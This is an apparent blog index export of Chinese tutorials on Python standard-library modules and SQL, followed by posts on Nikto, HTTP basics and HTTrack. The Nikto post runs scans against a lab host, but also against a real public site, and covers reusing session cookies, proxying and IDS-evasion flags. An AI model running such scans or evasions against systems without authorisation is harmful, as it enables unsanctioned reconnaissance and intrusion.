      <content type="text"><![CDATA[SQLite是一个轻量级的数据库，Python自带。SQLite作为后端数据库，可以搭配python建立网站。 0x00 创建数据库123456789101112131415161718192021222324252627282930313233343536# coding:utf-8import sqlite3# 导入SQLite3接口conn = sqlite3.connect(&quot;test.db&quot;)# 连接数据库c = conn.cursor()c.execute(&apos;&apos;&apos;CREATE TABLE category ( id INT PRIMARY KEY,sort int, name text)&apos;&apos;&apos;)c.execute(&apos;&apos;&apos;CREATE TABLE book (id int primary key, sort int, name text, price real, category int, FOREIGN KEY (category)REFERENCES category (id))&apos;&apos;&apos;)# #创建category表和book表c.execute(&quot;INSERT INTO category VALUES (1, 1, &apos;bird&apos;)&quot;)c.execute(&quot;INSERT INTO category VALUES (?, ?, ?)&quot;, (6, 9, &apos;computer&apos;))#查询数据c.execute(&quot;SELECT * FROM book&quot;)print(c.fetchone())for row in c.execute(&apos;select * from category&apos;): print(row)#更新数据c.execute(&quot;UPDATE category set sort = ? where id = ?&quot;, (1000, 1))#删除表c.execute(&quot;DROP TABLE category&quot;)#提交(保存)conn.commit()#关闭数据库连接conn.close() SQLite时磁盘上的一个文件。test.db开始并不存在，SQLite将自动创建一个新的文件。 让后调用execute()函数执行SQL语句。 SQL语句中的参数，使用“?”作为替代符号，并在后面的参数中给出具体的值，这样可以增加程序的安全性。 执行查询语句以后，python将返回一个循环器，包含查询的全部记录，我们可以使用fetchone()方法\和fetchall()方法读取记录，也可以循环读取。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(9)-进程信息-os包]]></title>
      <url>%2F2016%2F07%2F13%2FPython%E6%A0%87%E5%87%86%E5%BA%93(9)-%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF-os%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00 os包中的相关函数os.uname()返回操作系统相关信息，类似于Linux中的uname命令 os.umask()设置该进程创建文件时的权限mask，类似于Linux中的umask命令get os.get(*)查询，*由以下代替uid,euid,resuid,gid,egid,resgid:权限相关，其中resuid主要用来返回saved UID，最小权限。pid,pgid,ppid,sid:进程相关。 put(*)设置，(*)由以下代替euid,egid:用于改写euid,egiduid,gid:改写进程的uid，gid。只用super user才有改写uid，gid的权利。pgid,sid:改写进程所在进程组（process group）和会话(session)。getenviron():获得进程的环境变量setenviron():更改进程的环境变量 saved uid 和saved gid要想要使得saved uid和saved gid始终保持最好的最小原则工作很难。因为当运行一个Python脚本时，实际运行的是Python这个解释器，而不是Python脚本文件，不同于C语言直接有C语言编译成的可执行文件。我们必须更改Python解释器本身的权限来运用saved UID机制，但这又很危险。只需执行一个由普通用户拥有的脚本，就可以得到super user的权限！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(13)-循环器-itertools]]></title>
      <url>%2F2016%2F07%2F12%2FPython%E6%A0%87%E5%87%86%E5%BA%93(13)-%E5%BE%AA%E7%8E%AF%E5%99%A8-itertools%2F</url>
      <content type="text"><![CDATA[0x00循环器时对象的容器，包含多个对象。通过调用循环器的next()方法，循环器将依次返回一个对象，直到所有对象遍历穷尽，循环器将举出StopIteration错误。 使用Python的内置函数iter()函数，我们可以将诸如表，字典等容器变为循环器。 12for i in iter([2, 5, 7, 0]): print(i) 但是标准库中的itertools包提供了更加灵活的生成循环器的工具。这些工具大多时已经有的循环器。 1from itertools import * 0x01 无穷循环器 count(5, 2) 从5开始的整数循环器，每次增加2 cycle(‘abc’) 重复序列的元素 repeat(1.2) 重复1.2,既1.2,1.2,1.2…. repeat(10, 5) 重复10，5次 0x02 函数式工具函数式编程时将函数本身作为处理对象的编程范式，Python也是对象，所以也可以进行一些函数式的处理，比如map()函数，filter()函数,reduece()函数。itertools包包含了类似的工具。这些函数接收函数作为参数，并将结果返回为一个循环器。 123456from itertools import *rlt = imap(pow, [1, 2, 3], [2, 4, 6])for num in rlt: print(num) imap函数的功能与map函数的功能类似，只是返回的不是序列，而是循环器，pow函数以此作用于后面两个列表的每个元素，并收集函数的结果，组成返回的循环器。 此外，还可以时使用下面的函数: 1starmap(pow, [(1, 1), (2, 2), (3, 3)&#125;) starmap()函数将以此作用于表中的每个tuple。 ifilter()\函数与filter()函数类似，同样ifilter函数返回的是一个循环器。 1234from itertools import *for i in ifilter(lambda x: x &gt; 5, [2, 3, 4, 5, 6, 90]): print i ifilterfalse()与上面类似，但是收集的是False的元素。 takewhile() 当函数返回Ture时，收集到循环器。一旦函数返回False则停止。 1234from itertools import *for i in takewhile(lambda x: x &lt; 5, [2, 3, 4, 5, 6, 90]): print i dropwhile() 当函数返回Ture时，跳过元素，一旦函数返回False，则开始收集剩下的所有元素到循环器。 1234from itertools import *for i in dropwhile(lambda x: x &lt; 5, [2, 3, 4, 5, 6, 90, 1, 2, 87, 89, 3, 4, 100]): print i 0x03 groupby()将key函数作用于原循环器的各个元素。根据key函数的结果，将拥有相同函数结果的元素分到一个新的循环器。每个新的循环器以函数返回结果为标签。 但是分组之前需要使用sorted()函数对原循环器根据key函数进行排序，让同组元素先在位置上靠拢。 1234567891011121314151617from itertools import *def height_class(h): if h &gt; 180: return &quot;tall&quot; elif h &lt; 160: return &quot;short&quot; else: return &quot;middle&quot;friends = [102, 191, 180, 111, 210, 123, 145, 160, 171]friends = sorted(friends, key=height_class)for m, n in groupby(friends, key=height_class): print(m) print(list(n)) 0x04 其他工具 compress(‘abcd’, [1, 1, 1, 0])根据[1, 1, 1, 0]的真假值情况，选择第一个参数’abcd’中的元素,a,b,c。 islice() 类似slice()函数，只是返回的是一个循环器。 izip() 类似于zip()函数，只是返回的是一个循环器。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(11)-math与random包]]></title>
      <url>%2F2016%2F07%2F12%2FPython%E6%A0%87%E5%87%86%E5%BA%93(11)-math%E4%B8%8Erandom%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00 math包math主要处理数学相关的运算，math包定义了两个常数: math.e 自然常数e math.pi 圆周率pi 下面是常用的运算函数: math.ceil(x) 对x向上取整，如x=1.2，返回2 math.floor(x) 对ｘ向下取整，如ｘ＝1.2，返回1 math.pow(x, y) 指数运算，得到ｘ的ｙ次方 math.log(x) 对数，默认基底为e，可以使用base参数来改变对数的基底，比如math.log(100, base=10) math.sqrt(x) 平方根 三角函数,接受一个弧度为单位的x作为参数:math.sin(x),math.cos(x),math.tan(x),math.asin(x),math.acos(x),math.atan(x) 角度和弧度互换:math.degress(x),math.radians(x) 0x01 random包 random.seed() 可以改变随机数生成器的种子seed. random.choice() 从序列的元素中随机挑选一个元素,如:random.choice(range(10) random.sample() 从序列中随机挑选k个元素 random.shuffle() 将序列中的所偶元素随机排序 random.random(a, b) 随机生成一个实数，在[a, b)范围内 random.uniform(a, b) 随机生成一个实数，在[a, b]范围内 123456import randomall_people = [&apos;jack&apos;, &apos;machl&apos;, &apos;chen&apos;, &apos;wnag&apos;, &apos;haha&apos;]random.shuffle(all_people)for i, name in enumerate(all_people): print(i, &apos;:&apos; + name)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(11)-多进程探索-multiprocessing包]]></title>
      <url>%2F2016%2F07%2F12%2FPython%E6%A0%87%E5%87%86%E5%BA%93(11)-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%8E%A2%E7%B4%A2-multiprocessing%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00 进程池进程池(process pool)可以创建多个进程。 如下代码。 12345678910# coding:utf-8import multiprocessing as muldef f(x): return 2**xpool = mul.Pool(5)rel = pool.map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])print(rel) 创建了一个可以容纳5个进程的进程池，Pool运行的每个进程都执行f()函数，并利用map()方法讲f()函数作用到表的每个元素上。 Pool还有以下常用的方法: apply_async(func, args)从进程池中取出一个进程执行func，args为func的参数。它将返回一个AsyncResult的对象，我们可以调用get()方法以获得结果。 close() 关闭进程池，不再创建新的进程 join() wait()进程池中的全部进程。但是必须对Pool先调用close()方法才能join. 0x01 共享资源我们应该尽量避免多进程共享资源，因为多进程共享资源势必带来进程间相互竞争，而这种竞争又会造成race condition，结果有可能被竞争的不确定行所影响，但若是需要我们依然可以通过共享内存和Manage对象这么做。 共享内存1234567891011121314151617# coding:utf-8import multiprocessing as muldef f(n, a): n.value = 3.14 a[0] = 5num = mul.Value(&apos;d&apos;, 0.0)arr = mul.Array(&apos;i&apos;, range(10))p = mul.Process(target=f, args=(num, arr))p.start()p.join()print num.valueprint arr[:] 对象Value被设置为双精度数（d），并初始化为0.0，而Array则有固定的类型（i，也就是整数).在Process进程中我们修改了Value和Array对象，并打印结果，主程序看到了两个对象的改变，说明资源确实在两个进程间共享。 ManagerManager对象类似于服务器与客户之间的通信(server-client).我们用以一个进程作为服务器，简历Manager来真正存放资源。 123456789101112131415161718192021# condig:utf-8import multiprocessing as muldef f(x, arr, l): x.value = 4.13 arr[0] = 5 l.append(&apos;hello&apos;)server = mul.Manager()x = server.Value(&apos;d&apos;, 0.0)arr = server.Array(&apos;i&apos;, range(10))l = server.list()proc = mul.Process(target=f, args=(x, arr, l))proc.start()proc.join()print(x.value)print(arr.value)print(l) Manager利用list()方法提供了表的共享方式。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[触发器]]></title>
      <url>%2F2016%2F07%2F06%2F%E8%A7%A6%E5%8F%91%E5%99%A8%2F</url>
      <content type="text"><![CDATA[0x00 前言触发器是一种特殊的存储过程，它在表中的数据发生变化时发生作用，触发器的作用就是保证参照完整性和数据的一致性。 SQL支持3种类型的触发器:INSERT(插入)，UPDATE(更新)，DELETE(删除)。 0x01 SQL Server中的触发器SQL支持两种类型的触发器:AFTER触发器和INSTEAD OF 触发器，其中AFTER触发器就是INSTER,UPDATE,DELETE触发器。 INSTEAD OF 触发器表示并不执行其定义的操作，而只是执行触发器本身。 0x02 使用CREATE TRIGGER创建触发器 INSERT 触发器 UPDATE 触发器 DELETE 触发器 INSTEAD OF 触发器系统帮助信息存储过程sp_help使用sp_help查看触发器的基本信息 sp_heletext使用sp_helptext查看触发器的正文信息，即触发器的创建语句。 sp_dependssp_depends能够查看触发器所引用的表，或指定的表涉及到的所有触发器。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SQL基础概念]]></title>
      <url>%2F2016%2F07%2F05%2F%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%A7%86%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[0x00 索引基础为了提高检索数据的能力，数据库引入了索引机制。索引是一个单独的，物理的数据库结构，是数据库的一个表中所包含的值得列表，注明了表的各个值所在的存储位置。 实际上，一个表的存储是由两部分组成的，一部分用来存放表的数据页面，另一个部分存放索引页面。通常，索引页面相对数据页面来说小得多。当进行数据检索时，系统先搜索索引页面，从中找到所需数据的指针，再通过指针从页面数据中读取数据。 可以把数据库看作一本书，把索引看作书的目录。 索引的结构按照存储结构的不同索引可分为两类，簇索引(ClusteredIndex)和非簇索引(Nonclustre Index)。 簇索引 簇索引与数据是混为一体的，它对表的物理数据页中的数据按列进行排序，然后重新存储到磁盘上，它的叶子节点存储的是实际的数据。 由于对表中的数据一一进行了排序，所以簇索引查找数据很快，但是所需的存储空间也很大，约为数据所占空间的1.2倍。 非簇索引 非簇索引与表的数据完全分离。非簇索引不必将物理数据页中的数据安装列排序，非簇索引值存储关键字的值和行定位器。 由于非簇索引使用索引页存储，比簇索引需要更多的存储空间，其检索效率较低。 表的数据行只能以一种排序方式存储在磁盘上，所以一个表只能有一个簇索引。 0x01 索引的使用创建索引的基本语句: 12CREATED INDEX index_nameON table_name (colum_name,....) 非簇索引的使用为StudentInfo中的sname字段创建非簇索引12CREATE INDEX Name_IndexON StudentInfo (sname) 非簇索引的使用当一个表建立了多个索引以后，数据库优化器会自动决定在查询期间使用哪个索引，当然也可以强制使用某种索引。 1234SELECT colunm1FROM tabel_nameWITH (INDEX (index_name))WHERE condition 不过，对于查询表中的所有记录，使用索引是毫无意义的。 当数据库表被删除时，和它相关的所有也会被删除。 多字段非簇索引为StudentInfo表中的性别(sex)和姓名(name)两个字段建立一个索引SexName_Index。 12CREATE INDEX SexNname_IndexON StudentInfo (sex,name) UNIQUE创建唯一索引唯一索引是指不允许在两行中存在相同的索引值。所以，如果使用INSERT或者UPDATE在拥有唯一索引的数据中生成一个重复值时，插入或者更新会被终止。 为StudentInfo表中的学号(sno)字段创建唯一索引Sno_Index,且指定降序排序。 12CREATE UNIQUE INDEX Sno_IndexON StudentInfo (sno DESC) CLUSTERDE创建簇索引不同于非簇索引，簇索引改变了表中数据存放的物理位置。簇索引不仅对索引中的键子值进行排序，而且对表中的行排序，以便使其与索引的排序相匹配。 创建单字段簇索引为StudentInfo表中的姓名(Sname)字段创建簇索引SnameCluseter_Index。 12CREATE CLUSTERED SnameCluseter_IndexON StudentInfo (Sname) 创建多字段索引为StudentInfo表中的sex和address字段创建簇索引SexAddressCluseter_Index。当然，先得删除已有的簇索引Snameclusteter_Index。 123DROP INDEX StudentInfo.Snamecluseter_IndexCREATE CLUSTERED INDEX SexAddresscluseter_indexon studentinfo (sex,address) drop索引销毁无论簇索引还是非簇索引都可以通过DROP INDEX关键字销毁。 1drop index studentinfo.name_index 销毁索引时记得一定要指明索引所在的表的名字。 0x02 视图视图不是一个真实存在的基础表，而是一张虚表。它是从一个或者多个表中导出的表，其结构和数据是建立在对表的查询基础上的。 视图有很多优点，主要表现咋简化操作，定制数据，合并分隔数据，安全性等方面。 创建视图创建一个与studentinfo表具有相同信息的视图studentinfo_view。 123create view studentinfo_viewasselect * from studentinfo 为视图创建视图为视图studentinfo_view包含的所有男同学创建一个视图boy_view。 1234create view boy_viewasselect * from studentinfo_viewwhere sex=&apos;man&apos; 为一列或多列创建视图1234create view NameAddress_Viewasselect snam,addressfrom studentinfo 创建与表具有不同字段名的视图12345create view new_view(boy_name,boy_address,sex)asselect sname,address,sexfrom studentinfowhere sex=&apos;man&apos; 利用视图简化表的复杂连接创建一个视图，包含Studentinfo表中的姓名(sname)字段，recruitinfo表中的系名(dname)以及department表中的录取分数(score)信息。 123456create view join_viewasselect snam,dname,scorefrom studentinfo,departmet,recruitinfowhere studentinfo.address=recruitinfo.addressand studentinfo.dno=deparentmet.dno 销毁视图可以通过drop view关键字销毁创建的视图 1drop view view_name 0x03 视图的创建与销毁]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SQL基础概念]]></title>
      <url>%2F2016%2F07%2F05%2FSQL%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%2F</url>
      <content type="text"><![CDATA[0x1 关于DMBS数据库这个术语是由数据管理系统（DataBase Management System，检查DBMS）管理的数据集。一个数据库系统应该具有以下四个特性。 允许使用数据定义语言(Data Definiton Language)，建立新的数据库，指定它们的模式(schema)。 能够查询和更新数据。 支持存储大量的数据，并能保存很长时间。 控制多用户的同时访问，使一个用户不影响其他用户，保证同时访问不会损坏数据。 0x01 数据库的体系结构大多数的关系型数据库都具有三级模式的结构特性:外模式，概念模式，内模式。 内模式又称为存储模式，是对数据的物理结构和存储方式的描述。数据如何存储，是顺序存储还是索引存储，索引以什么方式组织等 概念模式又称为数据库模式，是数据库中全部数据的逻辑结构的描述，它可以看作是现实世界的实体在具体数据库中的实现。 外模式_又称为用户模式或者子模式，通常由概念模式导出，是概念模式的子集，主要功能是定义允许用户操作的数据。可以理为用户看到的数据视图。 0x02 关系数据库 关系模型关系模式把世界看作是由实体(Entity)和联系(Relationship)构成的。所谓实体是指现实世界中具有区分于其它事物的特征或属性，又与其它实体有联系的对象。 关系模式中，实体通常以表的形式来表现。表的每一行描述实体的一个实例，表的每一列描述实体的一个特征或属性。 关系，属性和数组在关系模式时使用，其对应的SQL描述为表，列和行。 范式构造数据库必须遵循一定的规则，在关系数据库中，这种规则就是范式。 第一范式(1NF)在任何的关系数据库中，第一范式(1NF)是对关系模式的基本要求，其主旨就是无重复的列。 第二范式(2NF)二范式是在第一范式的基础上建立起来的，它必须先满足第一范式。第二范式要求数据库中的每个实例或行必须是唯一的。为了实现这种唯一性，通常要为表添加一个唯一标识列，这个唯一属性列被称为主关键字或主键，主码。 同时第二范式还要求实体的属性完全依赖于主关键字。 第三范式(3NF)第三范式必须先满足第二范式，简而言之，第三范式要求一个数据库表中不包含已经在其他的表中包含的非主关键字信息，否则就会有大量的数据冗余。 0x03 SQL的层次结构目录(Catalog)是SQL环境的重要组成部分，是模式的集合。而模式对象位于目录的底层。 SQL:1999定义了基本表，视图，域，约束，触发器等11种模式对象，这些对象构成了SQL环境的基础。 0x04 SQL环境中对象的命名规则 标识符不区分大小写。 标识符只允许使用字母，数字和下划线。 不允许使用SQL关键字。 一个完整的模式对象标识符应该包括目录的名称，模式的名称和模式对象的名称，各个名称之间使用(.)隔开。 如表Stuent在StudentSchema模式中，而这个模式又在StudentCatalog目录中，那么该表完全合格的名称就是StudentCataloh.StudentSchema.Student]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Nikto]]></title>
      <url>%2F2016%2F07%2F03%2FNIkto%2F</url>
      <content type="text"><![CDATA[DvwaDvwa是metasplotiable中的一个应用网站，该应用网站集成了大量的网站漏洞，值得我们探索和研究。 首先我们获得metasploitable的ip地址：192.168.86.130Kali的ip地址:192.168.86.134 然后访问Metasplotiabel的ip地址，进入Dvwa应用网站，选择DVWA Security的安全等级选择为low。 0x01基于之前的渗透方法，现在要更进一步的减少与目标主机的交互。Htttrack可以将目标网站克隆下来，以实现离线分析目标网站。 0x02 手动扫描除了使用扫描工具之外，还可以人为的去观察目标网站，作为一个客户去访问该网站显示存在的漏洞，但是纯手动的扫描一般只能看到网站开发者能让你看到的页面，这时便可以使用扫描工具来提高手动扫描的效率，去发现一些鲜为人知的页面。 0x03 NIKTONikto是一个用来发现默认网页文件、检查网页服务器和CGI安全问题的工具，它是开源的，使用Perl开发，可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件CGIs；超过625种服务器版本；超过230种特定服务器问题；以及一些WEB Application层面的漏洞它也会去扫描。 Nikto的作者是Chris Sullo，他是开放安全基金会(Open Security Foundation) 的财务总监。 避免404误判很多服务器不遵守RFC标准，比如对于不存在的对象返回200相应代码。那么当扫描器遇到这种情况下便会产生误判。 扫描器是如何尝试解决的？Nikto的解决方发是:在开始扫描以前，在每条命令执行之前，会在自己的数据库中将web中常见文件的扩展名提取出来，随机使用一些文件名拼接这些扩展名(这些随机的文件名+扩展名的文件对于目标服务器来说通常是不存在的)让后再向目标服务器发起请求。然后根据不同扩展名返回的信息，进行HASH摘要，以此得到该文件不存在时得到的响应信息。然后Nikto再开始真正的扫描发起。 如果这些还是不能得到404响应的真实性，那么最新版本的Nikto还会将得到的响应内容去除时间信息后取得MD5值进行hash校验。 同时也可以使用参数-non404，去掉前期判断，但是这种提高性能而舍弃准确率的做法，并不建议。 Nickto的使用首先升级Nikto: 1$: nikto -update 但是由于伟大的墙的存在，不一定能更新成功，此时可以访问到Nikto官网下载安装包:http://cirt.net/nikto/UPDATES. nikto host 扫描1root@kali:~# nikto -host 192.168.86.130 -port 80 nikto 进行ssl扫描1root@kali:~# nikto -host www.baidu.com -port 443 -ssl -ouput 将扫描结果输出保存对host列表进行批量扫描1$: nikto host -host.txt -host.txt 的文本格式如下: 1234---host.txt---192.168.0.1:80https://192.168.1.1:8333192.168.0.2 nmap与nikto1$: nmap -p80 192.168.1.4/24 -oG - | nikto -host - 将nmap获得的ip地址结果作为输出通过管道传送给nikto nikto代理同样nikto可以通过代理扫描： 1$: nikto -host https://www.baidu.com -useproxy htpp://localhost:1080 -vhost当一个网站存在多个端口时可以使用-vhost遍历所有网站进行扫描 nikto的配置文件有些网站需要登录以后才可以进行扫描，此时可以设置nikto的配置文件手动将cookie添加到nikto的中。nikto的配置文件是 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$: vi /etc/nikto.conf########################################################################################################## CONFIG STUFF# $Id: config.txt 94 2009-01-21 22:47:25Z deity $########################################################################################################## default command line options, can&apos;t be an option that requires a value. used for ALL runs.# CLIOPTS=-g -a# ports never to scanSKIPPORTS=21 111# User-Agent variables: # @VERSION - Nikto version # @TESTID - Test identifier # @EVASIONS - List of active evasionsUSERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)# RFI URL. This remote file should return a phpinfo call, for example: &lt;?php phpinfo(); ?&gt;# You may use the one below, if you like.RFIURL=http://cirt.net/rfiinc.txt?# IDs never to alert on (Note: this only works for IDs loaded from db_tests)#SKIPIDS=# The DTDNIKTODTD=/var/lib/nikto/docs/nikto.dtd# the default HTTP version to try... can/will be changed as necessaryDEFAULTHTTPVER=1.0# Nikto can submit updated version strings to CIRT.net. It won&apos;t do this w/o permission. You should# send updates because it makes the data better for everyone ;) *NO* server specific information# such as IP or name is sent, just the relevant version information.# UPDATES=yes - ask before each submission if it should send# UPDATES=no - don&apos;t ask, don&apos;t send# UPDATES=auto - automatically attempt submission *without prompting*UPDATES=yes# Warning if MAX_WARN OK or MOVED responses are retrievedMAX_WARN=20# Prompt... if set to &apos;no&apos; you&apos;ll never be asked for anything. Good for automation.#PROMPTS=no# cirt.net : set the IP so that updates can work without name resolution -- just in caseCIRT=107.170.99.251# Proxy settings -- still must be enabled by -useproxy#PROXYHOST=127.0.0.1#PROXYPORT=8080#PROXYUSER=proxyuserid#PROXYPASS=proxypassword# Cookies: send cookies with all requests# Multiple can be set by separating with a semi-colon, e.g.:# &quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie val&quot; #STATIC-COOKIE=# The below allows you to vary which HTTP methods are used to check whether an HTTP(s) server # is running. Some web servers, such as the autopsy web server do not implement the HEAD methodCHECKMETHODS=HEAD GET# If you want to specify the location of any of the files, specify them hereEXECDIR=/var/lib/nikto # Location of NiktoPLUGINDIR=/var/lib/nikto/plugins # Location of plugin dirDBDIR=/var/lib//nikto/databases # Location of database dirTEMPLATEDIR=/var/lib/nikto/templates # Location of template dirDOCDIR=/var/lib/nikto/docs # Location of docs dir# Default plugin macros@@MUTATE=dictionary;subdomain@@DEFAULT=@@ALL;-@@MUTATE;tests(report:500)# Choose SSL libs: # SSLeay - use Net::SSLeay # SSL - use Net::SSL # auto - automatically choose whats available # (SSLeay wins if both are available) LW_SSL_ENGINE=auto# Number of failures before giving upFAILURES=20 User-Agent:\ 默认的是firefox浏览器。此外还可以下载firefox的User-Agent插件，比如基于freifox浏览器的User-Agent Switcher可以进行移动端，PC端，以及操作系统的组合伪装。 12345# User-Agent variables: # @VERSION - Nikto version # @TESTID - Test identifier # @EVASIONS - List of active evasionsUSERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID) RFI URL:用于验证远程文件的正确性 Proxy settings:代理设置 12345# Proxy settings -- still must be enabled by -useproxyPROXYHOST=127.0.0.1PROXYPORT=1080#PROXYUSER=proxyuserid#PROXYPASS=proxypassword cookies设置将已经登录网站的cookies存放再nikto.conf中，便可以登陆该网站了。随便打开一个网站，对该网站启用Firebug，并启用cookies功能，登录该网站，分析cookies信息，比如百度，分析firebug的cookies项可以看到过期时间(Expires)，将过期时间下对应的有会话(Session)字段的项中的名称(Name)和内容(Value)copy，添加到/etc/nikto.conf中 12345# Cookies: send cookies with all requests# Multiple can be set by separating with a semi-colon, e.g.:&quot;HBDRCVFR[Fc9oatPmwxn]=&quot;12345678&quot;;&quot;BD_CK_SAM&quot;=&quot;cookie val&quot; ;&quot;BD_HOME&quot;=&quot;cookie val&quot;;&quot;H_PS_PSSID&quot;=&quot;cookie val&quot;;....&quot;&quot;#STATIC-COOKIE= -evasion IDS躲避技术IDS(instruion Detection System) 入侵检测系统IDS可以被定义为对计算机和网络资源的恶意使用行为进行识别和相应处理的系统，包括系统外部的入侵和内部用户的非授权行为，是为保证计算机系统的安全而设计与配置的一种能够及时发现并报告系统中未授权或异常现象的技术，是一种用于检测计算机网络中违反安全策略行为的技术。 所以当一个目标中存在IDS技术时可以使用参数-evasion来逃避，nikto的逃避方式一共有八种,可以同时指定多种: 随机URL编码(非utf-8) 自选择路径 过早结束的URL 优先考虑长随机字符串 参数欺骗 使用TAB作为命令的分隔符 使用变化的URL 使用Windows路径分隔符 比如: 1$: nikto -host http://192.168.1.34/dvwa/ -evasion 167]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTTP协议基础]]></title>
      <url>%2F2016%2F06%2F30%2FHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[0x00 Web技术发展从静态Web到动态Web，从C/S模式到B/S模式，从PC到到移动端，互联网技术日新月异，翻天覆地，每个领域都在不断的细化。 动态web是可交互的，它会根据不同的用户输入返回不同的结果。 0x01 Web宏观攻击一个动态Web的宏观攻击可以分为以下几种: Network OS Web ServerWeb服务器端 APP Server移动服务器端 Web ApplicationWeb应用程序 Database数据库，比如sql注入 Browser浏览器，比如同源策略，沙箱技术 当今的web攻击类型有几百种，但大部分是针对Web应用程序和数据库的攻击。 0x02 HTTP协议基础 明文HTTP协议是明文协议，无内建的机密性安全机制，简单的嗅探或代理截断便可查看全部明文信息。 而HTTPS也只是对传输的过程进行了加密而已，不代表整个数据流的传递过程都是安全的，只是提高了传输层的安全而已，对于任意节点都是可以发起攻击。(比如中间人攻击，对网络传输的任意节点劫持，然后更改网络数据后再投放到网络中去。) 无状态每一次客户端和服务器端的通信都是独立的过程，http协议是不可跟踪用户行为信息的，但是web应用却是需要跟踪客户端会话(既是多步通信)，此时便需要cookie和session的概念了。 服务器通过cookie来验证用户，然后使用sesison用于在用户身份验证后跟踪用户行为轨迹。若是不使用cookie那么客户端的每次请求都要进行身份验证，显然这是不现实的。 基本上session id和cookie是等同的，客户端可以拿到的是session id。 HTTP header一次http请求会包含多个header信息，这里只了解与安全相关的header信息。 Set-Cookie:服务端发送给客户端的Session ID(存在被窃取的风险) Content-Length:响应body部分的字节长度，应用场景:用于验证表单暴力破解web账号登陆密码是否成功。 Location:重定向用户到另一个页面，可识别身份认证后允许访问的页面。 前三个都是响应头，下面是常用的请求头 Cookie：客服端发回给服务器证明用户状态的信息(使用键值对的形式存放 cookie1:data;cookie2:data…) Referrer:发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容易被修改绕过。 状态码服务器端响应的状态码表示响应的结果类型，5大类50多个具体响应码。 它们分别是100系列，200系列，300系列，400系列，500系列。 100s:服务器响应的信息，通常表示服务器还有后续处理，基本不会单独出现。 200s:请求被服务器成功接受并处理后返回的响应结果。 300s:重定向，通常再身份认证成功后重定向到一个安全页面(301:表示永久重定向，302临时重定向) 400s:表示服务器不接受客客户端，客服端请求错误: 401:表示需要身份认证。 403:表示拒绝访问，不具备访问权限。 404:目标未发现。 500s:服务器内部错误(503:表示服务不可用) 当然状态码远远不至于这些，可以通过https://www.w3.org/,这个网站来查看状态码。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Httrack，vega]]></title>
      <url>%2F2016%2F06%2F30%2FHttrack%2F</url>
      <content type="text"><![CDATA[0x00 DVWADVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。 可以设置不同难度的演练模式，low，medium，hight，low模式下的漏洞较多并且容易发现。 更详细的操作以后再说。 0x01 HttrackHTTrack Website Copier是一个免费并易于使用的线下浏览器工具,它能够让你从互联网上下载整个网站进行线下浏览。浏览线下站点和线上并没有什么不同。HTTrack同样可以进行线下线上站点同步,支持断点续传。 使用Httrack可以讲一个网站拷贝下来，以此进行下线的探测发现，以此减少对目标网站的直接交互。 Httrack的使用很简单，只需要根据其向导按步骤进行就好了。 12345678910111213141516171819202122232425262728293031323334353637383940414243root@kali:~# httrackWelcome to HTTrack Website Copier (Offline Browser) 3.48-21Copyright (C) 1998-2015 Xavier Roche and other contributorsTo see the option list, enter a blank line or try httrack --helpEnter project name :Dvwa#工程名称Base path (return=/root/websites/) :/root/httrackWeb#这是一个大的目录，所有httrackcopy网将会根据域名或者ip分为不同的小路劲Enter URLs (separated by commas or blank spaces) :http:192.168.86.130/dvwa/#要copy的网站地址Action:(enter) 1 Mirror Web Site(s)#直接镜像 2 Mirror Web Site(s) with Wizard#在向导指示下进行镜像 3 Just Get Files Indicated#获得特定文件的格式文件比如doc，pdf 4 Mirror ALL links in URLs (Multiple Mirror)#惊醒当前url下的所有连接 5 Test Links In URLs (Bookmark Test)#测试连接 0 Quit:2Proxy (return=none) :#代理地址You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zipWildcards (return=none) :You can define additional options, such as recurse level (-r&lt;number&gt;), separed by blank spacesTo see the option list, type helpAdditional options (return=none) :---&gt; Wizard command line: httrack http:192.168.86.130/dvwa/ -W -O &quot;/root/httrackWeb/Dvwa&quot; -%v Ready to launch the mirror? (Y/n) :yWARNING! You are running this program as root!It might be a good idea to run as a different userMirror launched on Sun, 31 Jul 2016 05:12:03 by HTTrack Website Copier/3.48-21 [XR&amp;CO&apos;2014]mirroring http:192.168.86.130/dvwa/ with the wizard help..Done.Thanks for using HTTrack!* 同时httrack也支持代理模式，可以到hidemyass免费获得代理链。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NEXPOSE]]></title>
      <url>%2F2016%2F06%2F30%2FNEXPOSE%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[OPENVAS]]></title>
      <url>%2F2016%2F06%2F30%2FOPENVAS%2F</url>
